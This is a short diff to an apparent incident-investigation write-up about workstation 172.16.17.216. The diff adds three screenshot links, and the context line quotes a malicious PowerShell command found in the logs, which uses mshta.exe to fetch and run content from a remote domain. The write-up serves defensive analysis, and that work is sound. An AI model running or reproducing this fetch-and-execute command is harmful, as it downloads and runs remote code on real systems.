@@ -29,6 +29,9 @@ Investigated workstation `172.16.17.216`. Process and terminal logs revealed Pow
     powershell.exe -Command "mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4"
 
 <img width="1392" height="710" alt="338-03" src="https://github.com/user-attachments/assets/44297761-1ad2-4e93-98af-a899aa00908c" />
+<img width="1547" height="714" alt="338-history" src="https://github.com/user-attachments/assets/46830a24-ec85-41dc-b824-423b69ec3920" />
+<img width="1225" height="520" alt="338-terminal" src="https://github.com/user-attachments/assets/ef98cb5d-eaa3-4944-9ccf-207ef88a08dc" />
+<img width="1567" height="773" alt="338-overcoatcommand" src="https://github.com/user-attachments/assets/a7cdb5b2-d772-4386-826c-e09c63da5e75" />
 
 
 
